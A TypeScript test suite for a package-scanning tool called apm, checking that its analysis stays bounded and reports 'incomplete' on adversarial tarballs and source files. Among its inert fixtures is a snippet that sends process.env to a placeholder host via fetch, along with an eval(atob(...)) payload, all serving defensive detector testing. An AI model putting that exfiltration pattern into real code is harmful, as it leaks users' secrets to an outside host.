// Criterion 1 of apm-score-v10: analysis is bounded in work for any input, and hitting any limit yields `incomplete`,
// never a clean-looking score. One work meter (src/meter.ts) covers the whole analysis; this suite runs a generator
// built against each phase (fixtures/adversarial.ts), the review's cases at 90b3072 among them, in a child process with
// a kill timer, and checks each finishes in under 2 s with the meter capped and is `incomplete` whenever it ran out.
// Every payload is an inert string; nothing runs and no host is contacted.
import { describe, expect, test } from "bun:test";
import { join } from "node:path";
import { z } from "zod";
import { analyze, ArchiveError, finalize, readTar, readTarball, SCORE_FLOOR, type TarEntry } from "../src/index.ts";
import { Meter } from "../src/meter.ts";
import type { Exports, Label } from "../src/flow.ts";
import { CrossFile } from "../src/xfile.ts";
import { GENERATORS, tgz } from "./fixtures/adversarial.ts";

const RUNNER = join(import.meta.dir, "fixtures", "adversarial-run.ts");

/** The capped meter the suite runs under: small enough that every generator below runs it out. */
const CAP = 10_000_000;

const Result = z.array(
  z.object({
    name: z.string(),
    n: z.number(),
    cpuMs: z.number(),
    wallMs: z.number(),
    used: z.number(),
    limit: z.number(),
    exhausted: z.string().nullable(),
    incomplete: z.array(z.string()).nullable(),
    score: z.number().nullable(),
    refused: z.string().nullable(),
    error: z.string().nullable(),
  }),
);

type Job = { name: string; n: number; maxWork: number; compose?: { name: string; n: number }[] };

/** Runs jobs in a child killed after `killMs`: a run that never returns cannot be stopped from inside its own process. */
async function run(jobs: readonly Job[], killMs: number): Promise<z.infer<typeof Result>> {
  const proc = Bun.spawn(["bun", RUNNER], { stdin: new Blob([JSON.stringify(jobs)]), stdout: "pipe", stderr: "pipe" });
  const timer = setTimeout(() => proc.kill(9), killMs);

  try {
    const [out, err, code] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited]);

    if (code !== 0) throw new Error(`the runner did not finish: exit ${code}${proc.signalCode ? ` (killed, ${proc.signalCode})` : ""}\n${err.slice(0, 2000)}`);

    return Result.parse(JSON.parse(out));
  } finally {
    clearTimeout(timer);
  }
}

/** What every result must satisfy: it finished in time, without an error, and a limit it hit never reads as clean. */
function expectBounded(r: z.infer<typeof Result>[number]): void {
  expect({ name: r.name, error: r.error }).toEqual({ name: r.name, error: null });
  expect({ name: r.name, fast: r.wallMs < 2_000 }).toEqual({ name: r.name, fast: true });
  expect(r.used).toBeLessThanOrEqual(r.limit + 1);

  if (r.exhausted !== null) {
    expect({ name: r.name, incomplete: r.incomplete?.[0]?.startsWith("analysis work limit") ?? false }).toEqual({ name: r.name, incomplete: true });
    expect({ name: r.name, refused: (r.score ?? 100) < SCORE_FLOOR }).toEqual({ name: r.name, refused: true });
  }

  // an archive apm will not read is refused outright (the registry records it unscorable), never scored
  if (r.refused !== null) expect(r.score).toBeNull();
}

describe("every generator, scaled past a capped meter, stops in time and says so", () => {
  test(
    "each finishes in under 2 s with the meter capped, and each that ran the meter out is incomplete",
    async () => {
      const jobs = GENERATORS.map((g) => ({ name: g.name, n: g.over ?? g.base * 4, maxWork: CAP }));
      const results = await run(jobs, 240_000);

      expect(results.map((r) => r.name)).toEqual(GENERATORS.map((g) => g.name));

      for (const r of results) expectBounded(r);

      // every generator that can runs the capped meter out; the rest stop at a limit of their own, incomplete, or are
      // refused as archives
      for (const g of GENERATORS) {
        const r = results.find((x) => x.name === g.name);

        if (g.over !== undefined) expect({ name: g.name, exhausted: r?.exhausted !== null }).toEqual({ name: g.name, exhausted: true });
        else expect({ name: g.name, stopped: r?.refused !== null || (r?.incomplete?.length ?? 0) > 0 || (r?.used ?? CAP) < CAP }).toEqual({ name: g.name, stopped: true });
      }
    },
    300_000,
  );

  test(
    "random compositions of the generators stay bounded (seeded; APM_TERMINATION_CASES runs more)",
    async () => {
      let seed = Number(process.env.APM_TERMINATION_SEED ?? 20261112);

      const rand = (k: number): number => {
        seed = (seed * 1_103_515_245 + 12_345) & 0x7fff_ffff;

        return seed % k;
      };

      const names = GENERATORS.map((g) => g.name);

      const pick = () => {
        const g = GENERATORS[rand(GENERATORS.length)] ?? GENERATORS[0];

        if (!g) throw new Error("no generators");
        // from a quarter of the base size to eight times it
        const scale = [0.25, 0.5, 1, 2, 4, 8][rand(6)] ?? 1;

        return { name: g.name, n: Math.max(1, Math.round(g.base * scale)) };
      };

      const cases = Number(process.env.APM_TERMINATION_CASES ?? 24);

      const jobs: Job[] = Array.from({ length: cases }, () => {
        const head = pick();
        const rest = Array.from({ length: 1 + rand(3) }, pick);

        return { ...head, maxWork: CAP, compose: rest };
      });

      const results = await run(jobs, 600_000);

      expect(results.length).toBe(cases);
      expect(names.length).toBeGreaterThan(10);

      for (const r of results) expectBounded(r);
    },
    700_000,
  );
});

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function analyzeFiles(files: Readonly<Record<string, string>>, extra: { maxWork?: number; maxCrossFileSteps?: number } = {}) {
  const manifest = { name: "probe", version: "1.0.0", license: "MIT", main: "index.js" };
  const a = analyze({ name: "probe", manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [], ...extra });

  return { a, score: finalize(a, STATE).score, incomplete: a.signals.find((s) => s.id === "incomplete")?.evidence ?? [] };
}

function generated(name: string, n: number): Record<string, string> {
  const g = GENERATORS.find((x) => x.name === name);
  const b = g?.make(n);

  if (!b || b.kind !== "files") throw new Error(`${name} is not a file generator`);

  return b.files;
}

describe("the review's findings at 90b3072", () => {
  test("1: the 435-byte doubling package is incomplete, not 100, and the fold is charged before it is built", () => {
    const src = generated("fold-doubling", 23)["index.js"] ?? "";

    expect(src.length).toBeLessThan(500);
    const { score, incomplete } = analyzeFiles({ "index.js": src });

    // before: an 8 MB constant and 100, with no incomplete mark
    expect(incomplete.join("\n")).toContain("builds constant strings past what apm works out");
    expect(score).toBeLessThan(SCORE_FLOOR);

    // templates, join and concat are charged the same way
    const t = analyzeFiles(generated("fold-template-join", 22));

    expect(t.incomplete.join("\n")).toContain("constant strings");
    expect(t.score).toBeLessThan(SCORE_FLOOR);
  });

  test("2: indexing many calls of one function is linear, written-file matching and labels are charged", async () => {
    // copying the call list on every call made this quadratic: 6,000 calls copied 18 million entries
    const [small, large] = await run(
      [
        { name: "flow-calls-one-function", n: 6_000, maxWork: 1e12 },
        { name: "flow-calls-one-function", n: 48_000, maxWork: 1e12 },
      ],
      120_000,
    );

    expect(small && large).toBeTruthy();
    // eight times the calls: linear work is about 8 times the units and the time, quadratic would be 64
    expect((large?.used ?? 0) / (small?.used ?? 1)).toBeLessThan(10);
    expect((large?.cpuMs ?? 0) / Math.max(20, small?.cpuMs ?? 1)).toBeLessThan(24);

    // matching every written file against every run file is charged pair by pair: past the file's flow allowance
    // the file is incomplete, never clean
    const written = analyzeFiles(generated("flow-written-files", 3_200));

    expect(written.incomplete.join("\n")).toContain("stopped following where values go");
    expect(written.score).toBeLessThan(SCORE_FLOOR);
  }, 150_000);

  test("2: cross-file resolution stops at its allowance at every step, final resolution included", () => {
    // before: an allowance of 1 processed 3 labels and reported exhausted=false
    const exportsOf = (path: string): Exports | undefined => (path === "b.js" ? new Map<string, Label[]>([["", ["env", "cred", "net"]]]) : undefined);
    const cross = new CrossFile(exportsOf, (_from, spec) => (spec === "./b.js" ? "b.js" : undefined), 1);
    const got = cross.resolve("a.js", ["import:./b.js#", "env", "net"]);

    expect(cross.exhausted).toBe(true);
    expect(got.size).toBe(0);
    // and it stays stopped
    expect(cross.resolve("a.js", ["env"]).size).toBe(0);

    const { incomplete, score } = analyzeFiles(
      { "index.js": "const {a}=require('./b.js');fetch('https://x.invalid',{method:'POST',body:a});", "b.js": "exports.a=process.env;" },
      { maxCrossFileSteps: 1 },
    );

    expect(incomplete.join("\n")).toContain("flows across files");
    expect(score).toBeLessThan(SCORE_FLOOR);
  });

  test("3: a PAX header of repeated digits is refused at once; a well-formed one still names the path", () => {
    const t = performance.now();
    const bad = tgz([{ name: "package/PaxHeader", data: new TextEncoder().encode("9".repeat(4_000_000)), type: "x" }]);
    let kind = "";

    try {
      readTarball(bad);
    } catch (e) {
      kind = e instanceof ArchiveError ? e.kind : String(e);
    }

    // before: an unanchored `\d+ path=` tried every digit as a record's start, quadratic in the header
    expect(kind).toBe("invalid");
    expect(performance.now() - t).toBeLessThan(1_000);

    const record = (key: string, value: string): string => {
      const body = ` ${key}=${value}\n`;
      let len = body.length + 1;

      while (String(len).length + body.length !== len) len = String(len).length + body.length;

      return `${len}${body}`;
    };

    const pax = new TextEncoder().encode(record("mtime", "1") + record("path", "package/a-long-name.js"));
    const good = tgz([{ name: "package/PaxHeader", data: pax, type: "x" }, { name: "package/short.js", data: new TextEncoder().encode("1") }]);

    expect(readTarball(good).map((e) => e.path)).toEqual(["a-long-name.js"]);

    for (const broken of ["12 path=a\n", "3 path=a\n", "x path=a\n", "11 patha.js\n", "11 path=a.js"]) {
      const tar = tgz([{ name: "package/PaxHeader", data: new TextEncoder().encode(broken), type: "x" }, { name: "package/x.js", data: new TextEncoder().encode("1") }]);

      expect({ broken, kind: kindOf(() => readTarball(tar)) }).toEqual({ broken, kind: "invalid" });
    }

    expect(kindOf(() => readTar(new Uint8Array(1024)))).toBe("ok");
  });

  test("5: built-in decoders past the decoded-text budget are incomplete, and none decodes past what is left", () => {
    // before: seven 60k-character atob calls scored 80, with a note and no incomplete
    const { incomplete, score } = analyzeFiles(generated("atob-past-decoded-budget", 7));

    expect(incomplete.join("\n")).toContain("past the 256 KB of decoded text apm reads");
    expect(score).toBeLessThan(SCORE_FLOOR);

    // one large decode cannot go past what is left: a single 400 KB base64 string is refused, not decoded
    const one = analyzeFiles({ "index.js": `eval(atob("${"A".repeat(400_000)}"));` });

    expect(one.incomplete.join("\n")).toContain("decoded text");
    expect(one.score).toBeLessThan(SCORE_FLOOR);
  });
});

function kindOf(fn: () => void): string {
  try {
    fn();

    return "ok";
  } catch (e) {
    return e instanceof ArchiveError ? e.kind : `other: ${String(e)}`;
  }
}

describe("the meter itself", () => {
  test("a meter that runs out names its phase, and the analysis is incomplete below the floor", () => {
    for (const maxWork of [1, 1_000, 100_000, 1_000_000]) {
      const { a, score, incomplete } = analyzeFiles({ "index.js": "const cp=require('child_process');cp.exec('ls');".repeat(2_000) }, { maxWork });

      expect({ maxWork, why: incomplete[0]?.startsWith("analysis work limit: apm stopped reading this version while") }).toEqual({ maxWork, why: true });
      expect(score).toBeLessThan(SCORE_FLOOR);
      expect(a.capabilities).toEqual([]);
    }
  });

  test("the unpack and the analysis share one meter: a tarball that spends it while inflating is never scored", () => {
    const meter = new Meter(1_000);
    let thrown = "";

    try {
      readTarball(tgz([{ name: "package/package.json", data: new Uint8Array(1_000_000) }]), 48 * 1024 * 1024, meter);
    } catch (e) {
      thrown = e instanceof Error ? e.name : String(e);
    }

    expect(thrown).toBe("MeterExhausted");
    expect(meter.exhausted).toBe("gunzip");
  });

  test("a gzip stream that inflates past what its trailer says is refused, so the charge made from it holds", () => {
    const real = tgz([{ name: "package/a.js", data: new Uint8Array(100_000) }]);
    const lying = new Uint8Array(real);
    const at = lying.length - 4;

    // the trailer's size, made smaller than what the stream inflates to
    lying.set([16, 0, 0, 0], at);
    expect(kindOf(() => readTarball(lying))).toBe("invalid");
    expect(kindOf(() => readTarball(real))).toBe("ok");
  });
});
